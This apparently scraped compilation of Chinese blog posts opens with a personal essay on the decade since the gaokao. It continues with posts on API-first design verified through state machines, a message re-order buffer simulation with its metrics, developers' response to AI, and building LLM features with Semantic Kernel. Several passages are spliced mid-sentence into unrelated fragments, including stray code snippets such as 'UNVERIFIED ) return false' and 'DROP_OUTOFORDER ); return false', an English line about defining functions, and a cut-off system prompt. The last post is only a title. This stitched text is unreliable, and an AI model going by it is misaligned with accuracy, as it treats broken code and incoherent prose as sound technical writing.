我不喜欢跟人比较，包括以世俗标准衡量，我还是过着一个相对失败的人生。但十年后，我至少有基本的确信：如果给我一个机会，让我重新选一次，跟某个同学互换生活，走那条「更好的路」，我还是更想成为自己。

-

我的高考已经过去 10 年，但某种程度上，我从未从学生时代的生活里毕业。比如这些年我的每一次旅行，都是当年毕业旅行的 Encore。

我还是大部分时间都在玩，只不过成年之后，你的生活就不再只有「分数」一个标尺，甚至只要你不 care，就没有什么东西能衡量你。这是作为成年人最棒的一件事，你可以在对自己负责的前提下随心所欲。

10 年前刚进大学的时候，有一个晚上，我躺在床上失眠了。因为大学好像没有我想象的那么好玩，至少远不如高中生活好玩。我甚至认为，未来我作为「大人」的人生，会就此黯淡下去，再也无法重现学生时代的美妙。

这个想法当然非常幼稚。实际上，过去 10 年我所经历的跌宕起伏，一路的各种收获，充满了学生时代的我，连做梦都想象不到的意外之喜。

回到今天，我又来到了一个「感觉未来一片黯淡」的时间点。当然，今天的我，对世界有了更深的认识，很难说事情会不会像过去十年一样峰回路转。但在茫茫未知面前，你能做的也只有往前走，成为自己。

或许这就是「人生如逆旅，我亦是行人」吧。
Source: 大破进击

## Great

**架構師觀點 - API Design Workshop**
最近這陣子，我對外分享的主題，其實都集中在 “API First” 身上。碰到一些朋友給我的 feedback, 我覺得挺有趣，我挑一個，放在這篇實做篇的最前面:

Andrew 你談的技巧 (例如: 狀態機, 認證授權, API 開發與測試) 其實我都懂，但是為何你能把這些技巧串再一起? 用這方法來開 API Spec, 我連想都沒想過，而且外面也沒多少人是像你這樣組合起來用的… blah blah (以下省略閒聊的 800 字)

是啊，這老兄講得沒錯啊，這的確是我自己的經驗談。我擅長的就是只靠幾樣精通的基本功夫，善加利用組合，就能拿來面對許多未知的問題。先前一篇聊職涯發展的文章，我就談到 “知識的連結”，這就是我展現出來的應用。當你每一項技巧都熟練到某種程度以上，你就有自由變化的能力了。能夠達到這種層次的技能不用太多，但是你只要多掌握一個，你能應付的範圍就是別人的好幾倍。我拿來應用在 API First 這主題，就是其中一個案例。

API 的成功與否，規格定的好不好 (這是設計議題) 占了 70% 以上，規格定對了，後面的實做 (效能，可靠度等等) 做得好才有加分。而 API 的規格怎麼定，講白了很吃設計者的經驗。前陣子 FB 都在分享一篇 “一流工程師可以用很簡單的方法解決問題”，這情境套用在 API 的設計上再洽當也不過了。你如果能看透 API 背後要解決的問題，開出適合的介面，並且用恰到好處的技術跟工具把她實現出來，這就是個成功的 API。對我而言，我的手法就是 OOP，如何用物件導向的想法去分析 API 背後要處理的問題，然後把物件的介面 (interface) 翻譯成 API 的規格。

因此，正文開始之前，我就加一段在正式演講都沒有談到的內容: 物件導向的思考方式 吧!

前言: 微服務架構 系列文章導讀

Microservices, 一個很龐大的主題，我分成四大部分陸續寫下去.. UNVERIFIED ) return false ; // check verify code here this . OpenAPI is used for RESTful APIs, while AsyncAPI is used for event-driven and message-based APIs.

2-8, 用狀態機驗證情境

前面 (從 2-1 ~ 2-6) 連續做了一連串的分析與設計的動作，請問: 你如何確認這設計 “可行” ?

我先不急著探討 “好” 或 “不好” 的問題，那包含主觀的成分在內；我先探討你的設計 “可行性” 有多高，這個比較基本。無法使用的設計，再好都沒用… 最理想的方式，就是直接拿實際案例來沙盤推演。如果光是在架構圖上面標示，就足以拿來驗證情境，那你就有機會做到前面講的: 設計好 contract 就能同步驗證、前後端開發、QA 等等階段同時進行的工作流程了。

我的作法很簡單，我常常在講，驗證狀態機的方式，就像在玩大富翁一樣 (現在的年輕人還有玩過這東西嗎? XDD)，把狀態機當作地圖，在起始狀態放個棋子；把你的情境要做的動作一條一條列出來，當作步驟。你只要讓情境往下走一步，同時把棋子在狀態機上面移動，每次移動都驗證是否符合狀態機的約束 (你走的 “操作”，跟目前的 “狀態”，還有下一步的 “狀態” 是否都一致)? 如果通通都符合，那恭喜你，至少代表你的設計已經通過基本的可行性驗證了。

這樣的驗證方法，也許你會覺得不夠精準 (因為還缺了很多細節，例如參數)，也不夠自動化 (還需要靠人腦 + 實體道具)，不過設計階段主要都是跟 “人” 溝通啊，要檢討的是 “人” 的設計，而不是真的要開始 DEBUG 細部的規格，因此這我反而認為是優點才對。而且到目前為止，設計都還停留在紙上作業，你沒有太多前期的作業需要投入大量的人力 (主要都還是靠 SA 這樣的角色做到這一步)，就足以驗證設計跟情境的符合程度了。我覺得可以 ASAP 就確認設計方向是否正確，對整個開發專案的風險管控來說是很重要的，因為比起跑得快，走對方項還更重要。方向對了你遲早都會到目的地；方向錯的話你跑的再快都沒有用。

這邊我就示範一小段驗證的過程。先來看看這個案例:

團隊裡 PO (Product Owner) 應該都能寫出這樣的 story 吧? 這串案例描述了步驟，也替每個步驟標示了 caller (誰) 做了什麼 action (操作)，完成後的 state (狀態)。執行前的狀態沒有特別標示，不過這是連續動作，前一動的完成狀態就是下一動的起始狀態了。

接下來就是分解動作，我們一動一動來看:

(S0-01), 會員本人 (A) 尚未成為巴站的會員，在好好買網站上註冊。

初始狀態是會員資料尚未建立的情況，因此這動作前的狀態應該是 created, 按照情境表的標示應該走 register 這操作，並且會到達完成狀態 unverified，操作的對象是 A-會員本人。從狀態機來看，的確存在這條路徑，並且角色也都符合，這步驟驗證通過。

(S0-01.1), 系統偵測到註冊成功的事件後，自動發出 email 送出驗證連結

這邊不影響狀態圖，單純 S0-01 完成後發出的 action-executed (action: register) 事件觸發後, 執行發送 email 的動作即可。這步驟驗證了有對應的事件就能完成這個操作，這步驟驗證通過。

(S0-02), 會員本人 (A) 註冊帳號後，透過 email 驗證帳號。

透過 email 點選驗證連結，會執行 verify 的操作。從狀態機上面可以看到存在這條路徑 (起始狀態: unverified, 最終狀態: verified, 操作: verify)，這個步驟驗證通過。

(S0-03), 會員本人 (A)買完商品，選擇到超商取貨。成立訂單後由系統本身發送簡訊通知

購買商品後，銷售系統會呼叫 API: Get 取得會員資訊。從狀態機上面可以看到，起始狀態: verified, 允許執行 Get 這個 action，這個步驟驗證通過

(S0-04), 超商需要會員的手機末三碼及姓氏 (不須完整姓名)。

訂單成立列印標籤時，需要讓協力廠商透過 API 取得個資列印標籤。但是這些協力廠商不一定能 100% 信任，因此 API 最好只提供剛好夠用的資訊即可。 透過狀態機可以確認，在目前狀態 verified, 可以執行操作: Get-Masked 取得遮罩後的個資。這個步驟驗證通過

2-9, 設計小結

寫到這邊，雖然還不到最終的 API Spec, 但是從分析的角度來看，API 必要的每個環節的結果都已經出來了，該有的 State / Entity / Action / Authorize / Event 其實都已經定義清楚，下一步就是按照你實際的開發技術 (例如: 你的 API 是想要採取 REST 風格，還是 GraphQL，亦或是 gRPC 等等) 對應成具體的規格文件了。

本來想要繼續寫下去，不過還有一段 security 的分析還沒聊到，這部分就挪到下一篇吧! 下一篇聊完 security 之後，開始把所有的分析結果都寫成 ASP.NET Core WebAPI !

這篇的內容，我大部分都是引用我先前兩場分享 ( DevOpsDays, .NET Conf )，以及一場直播的場合分享的內容。相關的資源我也都一起列在下面:

感謝各位讀到這裡，也請期待下一篇 :)
Source: 安德魯的部落格

**架構面試題 #5: Re-Order Messages**
好久沒有來練習解題的技巧了，這次來聊個有趣的題目:

如果我透過 API 短時間收到大量的 Request, 我如何保證訊息必須按照順序處理?

順序問題，我常碰到的是都不分青紅皂白的就丟到 Message Queue, 結果塞進去的順序就已經不對了，才來問我順序該怎麼辦, 我只能雙手一攤說我也沒轍啊 XDD! 如果你沒辦法一開始就用對的順序放進 Message Queue，你就必須自己面對這問題了。這篇我就是想來聊聊，當 “必要” 時，你會如何處理這種問題?

當年在學網路通訊時，TCP 跟 UPD 的差異就是會處理封包順序 & 重送問題，也剛好讀過背後的作法，你懂原理後就會有機會自己解決。類似例子其實很多，QoS 的應用也是，先前研究過的 微服務基礎建設: 斷路器 #1, 服務負載的控制 那篇，你懂 QoS 怎麼做 Rate Limit，必要時你就能自己解決商業需求。

練習前的思考: 我需要了解這些機制嗎?

所以，別再糾結 “是否有必要重新發明輪子” 的問題了，你不需要重新發明每個輪子，但是要不要讓自己有能力重新建立 “必要” 的輪子，就是你的選擇了。我認為最佳的平衡點，就是做好必要的練習就夠了，一方面投入不算多，另一方面可以得到保障，確保你有能力建構複雜且需要高度整合的系統。我自己擔任架構師的角色，這投資是很值得的，因為我有不得不面對這些難題的理由。對這問題我下個結論:

你需要有能力了解原理 (但不用真的去開發)，然後才能判斷要不要自己開發 (重新發明輪子)。如果必要，你才有能力執行。

因此，有沒有必要? 你需要自行判斷。一般小規模的案子應該都不需要用上這樣的技巧，但是當你負責特定系統的關鍵設計時，你可能就需要具備這樣的能力，確保系統的開發不會被技術限制所影響。你需要做的，至少先了解背後的原理或是演算法，並且照著這篇的練習，練過你就知道真正要自己做的難度，在心裡記得這經驗即可。這些練習不大花時間，但是將來你在判斷技術選擇時，就能幫助你立刻做出技術決策。

1. DROP_OUTOFORDER ); return false ; } else { if ( data . 以這案例， #1, #2 會直接送出 ( SEND_PASSTHRU )，不會再 Buffer 停留 (頂多就 0.x msec 處理時間而已)。但是因為 noise 的關係，#3 比 #2 還早送到 Buffer, 因此 #3 會被暫存放在 Buffer, 等待 #2 已經 SEND 出去後，才會一起把預先放在 Buffer 的 #3 一起 SEND_BUFFERED 出去。

#3 因為 Buffer 的處理，會多一段延遲，這段就是這指標 Max Delay 要追蹤的數字。

4-1, 模擬測試 (100, 500, 10)

先用預設值跑一次吧，預設的組態，跟跑完的 Metrics 統計如下:

Configuration: - command_period: 100 msec - command_noise: 500 msec - buffer_size: 10 ReOrderBuffer Overall Metrics: - Push: 990 - Send: 990 - Drop: 0 - Drop Rate (%) 0 % - Max Delay: 1237.963 msec - Average Delay: 104.525 msec - Buffer Usage: 10

過程中每個指標我都有輸出 CSV, 我只拉出 Drop, Buffer Usage & MaxDelay 這幾個數值出來觀察:

綠線代表因 Buffer 而造成的 Delay, 事後我逐步追查 log, 解讀是這樣:

平均約在 100ms 以下的部分，單純就是順序不對，放在 Buffer 內等著下一個 command 收到後調整回來。這些大約都在 100ms 以內能夠修正，正常的發揮。 圖表上有 8 個大約 500ms 以上的 Peak, 這先瞬間變大的延遲, 其實是來自那 1% 送丟的 command, 因為 Buffer 夠大，這些送丟的 command 後面會牽連著幾個 command, 最多被延遲到 10 個週期後才被強迫送出。

了解了什麼情況會看到甚麼樣的數值之後，看後面的 dashboard 呈現，你應該就能更快的看到監控畫面掌握到實際的運作狀況了。這是很重要的一環，除了快速監控了解狀況之外，這也對於狀況的解讀，以及安排快速反應的 SOP 有很大的幫助。

4-2, 模擬測試 (100, 100, 10)

維持 4-1 的組態，我只把 command_noise 從 500 降到 100 (傳輸延遲從 0 ~ 500 msec 隨機飄移，縮減到 0 ~ 100 msec 隨機飄移，可以把它當作外在的網路品質變好了)，跑完的結果如下:

Configuration: - command_period: 100 msec - command_noise: 100 msec - buffer_size: 10 ReOrderBuffer Overall Metrics: - Push: 990 - Send: 990 - Drop: 0 - Drop Rate (%) 0 % - Max Delay: 1134.016 msec - Average Delay: 52.932 msec - Buffer Usage: 10

同樣抓三個指標的數值畫成圖表:

這邊花點篇幅聊一下 Delay, 這邊的 Delay 只計算 Buffer 收到 Command 後，因為暫存在 Buffer 內延遲了多少時間 (主要就是 SEND_BUFFERED 的狀況)，傳輸延遲 ( 0 ~ 500 msec 那個 ) 是沒有計算在內的，因為我把它當作外在因素，無法改善的，所以在指標上我沒有特別統計他。

因此這個數字的好壞，完全取決於我收到的 Command 到底順序排得有多 “亂” ? 越亂的順序，越需要依賴站存在 Buffer 內重排，系統就會越察覺到 Command 經過 Buffer 後卡多久才會被送出? 這也是個適合的 SLO 目標。

在其他條件都不變的情況下，網路改善 ( command_noise 從 500 msec -> 100 msec )，就可以讓 Max Delay 從 1237.963 msec 進步到 1134.016 msec, 這就是能觀察到的改變

從圖表來看，調低了 noise ( 500 -> 100 ), 你會發現綠線 delay 的指標，跟 4-1 相比, 100ms 以下的單純錯位修正幾乎都不見了，只剩下傳輸丟失的 Peak 還在。

4-3, 模擬測試 (100, 500, 5 ~ 1)

如果網路品質都固定在 500 ( command_noise ), 我只調整 buffer_size, 從 10 降為 5, 3, 1 各模擬一次, 我直接貼三份模擬結果出來:

模擬測試 (100, 500, 5):

Configuration: - command_period: 100 msec - command_noise: 500 msec - buffer_size: 5 ReOrderBuffer Overall Metrics: - Push: 990 - Send: 990 - Drop: 0 - Drop Rate (%) 0 % - Max Delay: 777.193 msec - Average Delay: 68.508 msec - Buffer Usage: 5

驗證了前面單元測試，當 Buffer 越大的時候，可能導致不必要的延遲 (因為有指令丟掉了，Buffer 越大只是卡越久而已)，Buffer Size 降成 5 反而讓延遲從 1237.963 msec 降到 777.193 msec.

模擬測試 (100, 500, 3):

Configuration: - command_period: 100 msec - command_noise: 500 msec - buffer_size: 3 ReOrderBuffer Overall Metrics: - Push: 990 - Send: 988 - Drop: 2 - Drop Rate (%) 0 % - Max Delay: 636.567 msec - Average Delay: 59.871 msec - Buffer Usage: 3

Buffere Size 真的越小越好嗎? 那我繼續降，這次我只開 Buffer Size = 3 再跑一次模擬。延遲繼續降了沒錯，從 1237.963 msec 持續降到 636.567 msec 沒錯，不過這樣的 Buffer Size 開始無法發揮修正順序的能力了。因為網路的品質關係，只有 3 的 Buffer Size 不足以提供足夠的緩衝，讓這些 Command 的順序有足夠的空間站存調整回正確的順序，因此這次模擬，已經觀察的到 2 個 Command 被收到後丟棄了 (DROP)。上面的統計被我四捨五入了，雖然顯示是 0%, 實際上是 0.2% …

模擬測試 (100, 500, 2):

Configuration: - command_period: 100 msec - command_noise: 500 msec - buffer_size: 2 ReOrderBuffer Overall Metrics: - Push: 990 - Send: 954 - Drop: 36 - Drop Rate (%) 3 % - Max Delay: 425.002 msec - Average Delay: 54.486 msec - Buffer Usage: 2

我再繼續降 Buffer Size, 這次用 2 來跑一次模擬。 很明顯的，Drop Rate 持續飆升，這次跑到 3% 了 (實際上 1000 個 Command, 網路傳輸掉了 10 個，只收到 990 個，而經過 Buffer 處理又被丟掉 36 個，最後成功往後送的 Command 只有 954 個)

模擬測試 (100, 500, 1):

Configuration: - command_period: 100 msec - command_noise: 500 msec - buffer_size: 1 ReOrderBuffer Overall Metrics: - Push: 990 - Send: 844 - Drop: 146 - Drop Rate (%) 14 % - Max Delay: 356.657 msec - Average Delay: 39.691 msec - Buffer Usage: 1

都做到這邊了，我就把 Buffer Size = 1 也跑完吧! Drop Rate 飆升到 14%

這類的機制，都是為了提高可靠度而設計的，應該把 Drop 數字控制在 0 的前提下，盡量降低延遲才是合理的作法。以這個組態，看起來最終決定的 Buffer Size 應該控制在 5 以上才合適。面對這樣的網路品質，給了合適的 Buffer Size, 就足以將錯誤的順序校正回來，並且維持 (最重要的是可以預測) 一定的延遲時間。

最後我把這組實驗的結果，放在同一張表格:

控制不變的參數:

command_period: 100

command_noise: 500

SN Buffer Size Drop Delay 1 10 0 1237.963 2 5 0 777.193 3 3 2 636.567 4 2 36 425.002 5 1 146 356.657

4-4, 改善

其實，這段要講的，就是我前面每一段都忍不住會提醒一下，我沒做的 “command timeout” 機制。

這類系統，其實最終都是看服務水準 (SLO, Service Level Objective) 目標怎麼定的。串流及時處理的系統，講求的都是延遲必須控制在保證範圍內。這邊我們能控制的，只有 Buffer Size, 如果 Command 送過來的速率是固定的話，其實 Buffer Size 就足夠了，反正速率 x 時間 就等於 容量了，基本上是能有對應關係的。

但是就如同上面的實驗，當 Buffer Size 越大，在極端情況下會讓 Command 非預期的留在 Buffer 過久，因此缺乏一個 “主動” 的機制，把停留太久的 Command 從 Buffer 強制拿出來 (不論是 SKIP 或是 DROP) 的機制，而也因為這次模擬我用的是 DateTime Mock, 篇幅有限我不大想在這基礎去擴充高精確度的 timer 來做這件事 (其實還是可以啦，有興趣的可以參考這篇: 後端工程師必備: 排程任務的處理機制練習)

結構上其實就跟 Flush(...) 類似，只是要有個高精確度的 timer, 時間到了就去觸發 Buffer, 定期檢查是否有該收到但是還沒收到的 Command, 要主動觸發 SKIP 事件? 或是定期檢查是否有 Command 已經被暫放在 Buffer 超出預期的時間，必須強制 DROP 該 Command?

如果有搭配這樣的機制，你就能放心的擴大 Buffer Size 了，這樣才是我認知中理想的服務設計。這類服務應該以 SLO 為主要目標，實做或是演算法都應該是支撐目標才對，而非目標來遷就設計 (抱歉，我只示範了一半 XDDD)。搭配 timer 做主動偵測，Buffer 的設計就會更有適應性，不但可以一次 allocate 足夠大的 Buffer Size, 確保能應付瞬間的變化，也能精準控制 delay 不會超過預期的範圍。良好的設計是能兼顧各種需求的，只是這次的範例我沒有實做到後半段。

這段，有興趣的朋友們可以親自動手測試看看，我把最困難的部分 (演算法，介面定義，實驗環境，測量機制) 都定義好了，有心想要成為架構師的，可以趁這機會練習體驗看看。如果你完成了，歡迎在底下留言跟我分享你的做法跟心得。

5, 總結

不知道看完這篇文章的朋友們，有多少人有參加 DevOpsDays Taipei 2023, 聽我講那場 “架構師也要 DevOps” 的演講?

其實我在裡面提到的用模型 + 模擬，來預先了解 & 解決維運問題，就是這篇我示範的整個過程。有很明確的規格或演算法，那通常是開發 (Dev) 領域擅長的，演算法設計，規格設計，甚至是單元測試，都能讓你做出如預期的成果。

但是這個例子，最終是要上戰場的服務啊，你無法控制網路品質，你也無法用 “計算” 的方式預估你要多大的 Buffer Size, 因此如果你沒有用模型來模擬，你也無從 “猜測” 你的做法是否能真的上線解決問題。

架構師難為的地方就在於，只有困難 (大家搞不定，也想不通怎麼解決) 的問題才會來找你。在這前提之下你從有了想法，到真的能上線驗證，通常需要花很長的時間才走得到這一步。因此，想進一切辦法，讓問題還在很早期的階段就能被驗證，對架構師這角色而言是非常重要的，如果你提出一個錯誤的方式，其他人要等半年後才能告訴你行不通，那架構師的存在意義就不見了不是嗎?

因此，長年面對這些難題，我才會發展出我自己驗證解決方案是否可行的流程，從概念就要把它建立成可被評估的模型，接著把它變成可被驗證可被執行的 MVP。這階段除了拿來驗證解題之外，也應該拿來驗證真實上線與監控等等行為 (現在越來越強調 DevOps, 開發維運一體化)。架構師的設計也不應該僅止於開發的規劃跟設計，維運的設計也應該包含在內才對。

所以，這篇文章的 (2), (3) 講的就是 Dev 的部分，而 (4) 則是講 Ops 的部分，綜合驗證設計後才真正發包給相關團隊實際開發出來，就是我整篇文章背後的思考脈絡。
Source: 安德魯的部落格

**[架構師觀點] 開發人員該如何看待 AI 帶來的改變?**
(圖片來源: DALL-E, 不過我參不透 AI 想表達啥 XDD)

九年前 (2016)，寫過一篇文章: .NET 開發人員該如何看待 Open Source Solutions?，當時會想寫這篇的動機很單純，那是個 Microsoft 新 CEO 剛上任, 策略大幅改變的年代, 所以我寫了這篇文章來說明我的看法。

到了 2023, 整個軟體資訊業，都被 AI 翻了一輪，Microsoft 大舉跟進 AI 相關應用與服務，我覺得另一個軟體開發領域的大改變來了。我去年本來也打算再寫一篇，無奈當時還是個 AI 的門外漢，應該寫不出什麼東西.. define functions like send_email(to: string, body: string), or get_current_weather(location: string, unit: ‘celsius’ or ‘fahrenheit’)

Convert natural language into API calls e.g. ……

隔天老師也補上他的看法:

.NET Walker 大內行者 貼文

我要拿 安德魯的部落格 在 2023年最後一天所寫的這篇文章，作為我 2024 的第一篇分享。不只是因為， Andrew 在這篇文章中多次提到我，更因為大概沒有任何人能比 Andrew 這篇文更清楚的說明，為何去年底，我會在 .NET Conf 2023 的講台上如此用力地說 : LLM 已然改變了整個軟體開發的走向。 當天我沒法說清楚講明白的，Andrew 在這篇文章中，都寫了出來。不僅如此，Andrew 還把我心裡想的，都實作了出來。 身為開發人員，你也和我們一樣，感受到身處的世界，所發生的震動了嗎? 這篇分享(包含範例)很值得你細細琢磨，你會看到軟體開發即將出現的變革，會理解為何去年我在台上如此聲嘶力竭。仔細思量，你也將會在今年，找到屬於你自己的新做法和新方向。 2024，我們來了。

然而，這些改變需要時間，我不知道還要多久可以發展到想像中的樣子，但是應該應該會在我退休以前實現吧 XDD, 因此我也沒有閃躲的機會，必須好好的面對這改變。AI 一定會帶來很多改變，甚至是很多我們現在根本無從預測的影響。

現在: 即使你還在用一樣的方法從事目前的領域，也請務必盡可能地善用 AI 來提升你的產能。雖然 AI 相較於其他運算，是很貴的，但是對於人力的投入來看只是千分之一的投資而已。對於工具的使用，別考慮了，只要有幫助都值得投資，一來有明顯成效，二來你會更理解 AI 是怎麼協助你的

未來: AI 不會一直停留在 “更好的 GitHub Copilot，協助你寫出現在這世代的程式碼” ..，總有一天，你現在在做的事情也會改變，到時就不是善用工具來加速你現在在做的事而已，而是你開始得面對新的想法，用新的工具做出成果。這天不會太久，從現在起你該為了將來做準備。

如果你跟我一樣，角色是架構師 (或是其他類似角色，能夠影響或決定軟體開發方向的人)，現在就是改變的時間點了，你必須做好準備，替你的團隊思考將來該改變的方向是什麼。
Source: 安德魯的部落格

**替你的應用程式加上智慧! 談 LLM 的應用程式開發**
圖片來源: DALL-E, 這篇都是過年期間的研究心得, 就用龍(年) + 未來都市當主題吧

上一篇文章 架構師觀點 - 開發人員該如何看待 AI 帶來的改變?，展示了我嘗試的 安德魯小舖 GPTs 整合應用，實現了讓 AI 助理的嘗試，我開始真的可以用自然語言就完成整個購買流程的操作了。過程中，AI 也幫我 “腦補” 了部分我 API 沒有提供的功能 (指定預算跟購買條件，AI 自動幫我思考購買組合)。這結果其實比我預期的還理想，完成之後，我開始探索接下來的這兩個問題:

未來的應用程式，會怎麼運用 “AI” ?

未來軟體開發的流程與角色，會變成甚麼樣貌?

因此，這篇我就要面向應用程式的開發面，來探討該怎樣把 “智慧” (我暫時把 “智慧” 解讀為能理解語意的能力，拿 LLM / Large Language Model / 大型語言模型 當作代表) 加到你的應用程式內。雖然目前 LLM 還有很多缺點，但是應該開始把 LLM 當作 “人” 來看待了，溝通的方式都要把它當作 “人” 的方式溝通 (因此要善用 prompt, 而不是 function + parameters)。這其實跟傳統的軟體開發結構完全不同，也是我這篇想繼續往下挖的主題。

上面我列的兩個問題，一個是未來的軟體執行方式，改變的是使用者使用軟體服務的習慣；另一個是未來軟體開發的架構，流程與分工，改變的是軟體開發領域的生態，包含服務，結構，開發框架，流程，工具等等，預期都會被 AI 翻了一輪。改變是必然的，不確定的是會怎麼變? 因此，我決定延續 “安德魯小舖” 這 PoC, 假設這是五年後的服務呈現的樣貌，那麼這過渡期間會如何發展? 如果五年後是這樣，那麼現在大家使用的工具與知識會有什麼變化?

這篇文章會分兩段，第一段我會以我用 Azure OpenAI + Semantic Kernel 重寫一次 “安德魯小舖”，並且從典型的應用程式，逐步加上 LLM 的應用的開發過程。

第二段則是想深入聊一下，LLM 應用的幾個重大架構設計上的改變。這點尤其重要，越資深的人 (例如我) 越容易陷入過去的經驗與慣性，碰到這樣的重大轉折點反而不容易反應過來。這段我想談談的就是我觀察到軟體設計架構，會因為 LLM 的引進，有那些變化。

我目前仍然是個 AI 的門外漢，這篇是野人獻曝的分享內容，單純分享我自己摸索過程而已。我習慣盡可能搞清楚全貌，再來學習會比較精準有效率。因此過年期間 K 了很多文章，總算搞清楚 Open AI / Semantic Kernel 在幹嘛。文內的敘述有錯的話歡迎留言通知我，感謝~

這篇文章會用到的相關資源:

1, “安德魯小舖” 的進化

先前，雖然完成了 “安德魯小舖 GPTs” 的 POC, 但是我仍然這不會是短期內 ( 1 ~ 3 年內 ) 大量運用 AI 的應用程式樣貌。把應用程式 Host 在 Chat GPT 上，還有很多不夠成熟的地方:

很容就踩到使用量的限制

並非每個消費者都有 Chat GPT plus 訂閱

Chat GPT 回應的速度跟可靠度都還不及

這些對線上交易而言都不是個很好的選擇，我相信 Open AI 會持續改善這些問題，不過算力珍貴 (現在是各大廠的必爭之地)，也不可能一夜之間改善，我覺得漸進式的在現有應用程式內加入 “智慧”，先從最需要 “智慧” 的環節改變，才是合理的發展路線。

於是，既然可行性已經確認，接下來就往產品發展的方向來思考了。我拆解了 “將應用程式加入智慧” 這願景，拆成這四個階段，重作了一次這題目，作為這篇 PoC 的主軸。開發細節跟程式碼，這篇實在寫不下，我就先截圖給大家體會，同時先提供 github repo, 有興趣的可以先看, 或是告訴我你想了解哪個部分，我看看是否整理成另一篇文章…

我想像中，安德魯小舖從典型的 APP 到智慧化的演進過程，應該有這幾個階段:

尚無智慧, 只提供 標準的操作模式 在關鍵環節使用 AI, 從操作意圖評估風險 操作過程使用 AI 輔助提示: 從操作歷程，即時提供操作建議 AI 能自主代替使用者操作: 全對話式的操作

在這個 PoC 的每個階段, 我都試著寫了一點 code 來試做可行性, 而我另一個目的也是想要掌握這類應用程式的開發結構，跟過去有多少差別? 對我而言，架構師要判斷 “該不該” 使用某些技術，比 “會不會” 使用，或 “專不專精” 這些技術還重要。我也期待在這次試作的過程中，掌握一些這類應用程式設計的手感。

雖然客觀的來看，要發展到 (4) 普及的階段還要好一段時間，至少要 3 ~ 5 年以上才會成熟吧。但是看看現在 Micosoft Copilot 跟 Open AI 的發展，我覺得技術發展應該都快要到位了，在等待的是廣大的軟體開發人員跟上，以及這些應用的關鍵資源門檻下降。

這個段落，我就摘要的說明一下我的 PoC, 並且聊一下我設計上的想法。

1-1, 標準的操作模式 (對照組)

(這邊我用了 console app + 選單的操作, 模擬上古時代功能型手機的那種操作體驗。如同那些不友善的 chetbot 應用一樣，你只是透過 IM 的外殼，來執行選單的操作而已。我拿這當作對照組，各位可以自行替換成 MVC 或是其他操作介面。

圖 1, 標準 console app 操作範例 (點擊可以看大圖)

我簡單的操作，基本上就是用數字選指令，有些指令有附加參數，就這樣而已。我示範的操作依序是:

列出商品清單 將啤酒 (id: 1) x 5 放入購物車 將綠茶 (id: 3) x 3 放入購物車 結帳 (支付代碼: 6741) 列出交易紀錄

這邊體驗一下就好，重點在後面延伸加入 LLM 處理的部分。

1-2, 從操作意圖評估風險

在關鍵功能 (我的定義: 結帳) 執行時，能靠 LLM 歸納與推理的能力提供個人化的建議，找出各種不是和交易執行的問題或是風險。除了 rule based 的規則檢查，應該有一個關卡是由 LLM 來進行前後文的邏輯推演，找出 “常識” 裡不合理的地方，提醒使用者。

圖 2, 結帳時 AI 會提示注意事項 (點擊可以看大圖)

這邊我說明一下背後發生什麼事情，重點摘要一下流程，並且把我下的提示 (prompt) 也列出來。下正確的提示是需要技巧的，既然都包裝成應用程式了，使用者不再是直接操作 Chat GPT, 因此 prompt 應該是由開發人員決定，在背後準備好呼叫 AI 來操作才對，使用者應該無感才合理。

因此我準備了兩段 prompt, 一個是 system prompt, 定義 “店長” 的人物設定，同時我也把店長任務的 SOP 一起寫進去了 (這部分應該變成知識庫，用 RAG 來處理才對，這邊省略)。

System Prompt 的內容如下:

你是 "安德魯小舖" 的助理店長, 負責協助引導每個來商店購買的客人順利結帳。 主要任務有三類: 1. 上面的那段話就貫穿了全貌，SK 就是讓開發者能夠整合這些智慧應用的利器 Models

講更具體一點，LLM (大型語言模型)，或是文字轉圖形、聲音等等模型都算。SK 提供了各種 connector 來抽象化這些模型的應用，可以連接多種模型，包含本地端運行，也包含透過 API 開 放的模型。你不必遷就特定的模型，就必須使用特定框架或是 API。 State / Memories

前面提到 RAG, 以及向量資料庫。向量資料庫就是 AI 儲存 “知識” 的地方，在 SK 內就是把它抽象化成 “記憶” ( Memory )，同樣的提供多種選擇與實做。你不必因為使用了某種向量資料庫，就要改變整個應用程式的寫法。 Side Effects / Plugins

就是我前面提到的 Skills, SK 在 1.0 之前，就是使用 “Skill” 這名詞，來描述你的應用程式，賦予了 AI 那些 “技能”。在 1.0 release 後改成 Plugins 這個比較工程味道的用語了。不過我個人比較喜歡 “Skill”, 在描述 AI 時，各方面來看把 AI 當作 “人” 來溝通會更容易理解，這時 Skill 比 Plugins 貼切多了。我一直覺得 Model 跟 Plugins 是相輔相成，Model 不夠成熟我根本不敢給他任何 Skill … 而有了 Skill 的 Model 才是個有才能的 AI，而不是只能出一張嘴的半殘角色。

其他都相對好理解，我真正想談的就是 Plugins, 我把前面 1-4 示範案例中，提到的 functions 片段程式碼貼出來 (這篇唯一的 source code 解說就這段了):

[ KernelFunction , Description ( "清空購物車。購物車內的代結帳商品清單會完全歸零回復原狀" )] public static void ShopFunction_EmptyCart ( ) { ... (這已經是 FAQ 了，以下省略)，我覺得那位 speaker 回答的還蠻妙的:

企業在面試工程師，沒有人能保證你短短幾小時面試過程中，挑選出來的人，每件事情都能做的很到位，寫 code 沒有 bug, 部署不會出錯等等，但是我們錄用他了。因為我們覺得他有潛力，能把事情做好，我們可以容忍他有一定的犯錯空間。 人類所有企業都這樣用人，人類沒有因此而毀滅，人類的社會文明也這樣持續的進步。 LLM 會犯錯，行為不保證一致，但是我們認為他有潛力，能把事情做得更好。同樣的事情發生在 AI 上面，組織 & 系統的運作能夠承擔這樣的差異，世界會持續的進步。因為過去幾百年來人類就是這樣發展起來的，AI 也可以

另外，這篇文章也有類似的觀點，蠻有意思的，可以花點時間讀一下:

“The End of Programming” 這篇我覺得講得很對啊 (有說服我)。某些角度，我們被現有很精準運作的系統刻板印象框住了，在要求 AI 解決過去精準執行體系無法處理的問題的同時，也要他有精準的結果 (其實這本質上就是矛盾的啊)。我們該做的，是要先區分出哪些該用精準的手段來處理，那些要用有智慧的手段來處理，然後才能對症下藥。

這就是我說的，看清楚全貌跟格局之後，你才會用對技術，才會把它用在對的地方。面對 AI 的進步，我想未來幾年，有太多這類問題需要思考了。我們都在這個變革內，無法閃開，只能面對。

最後這段寫了一堆，看看就好。我很歡迎大家跟我討論聊聊不同的看法，歡迎在下方留言回應 :D
Source: 安德魯的部落格

**替你的應用程式加上智慧! 談 RAG 的檢索與應用**
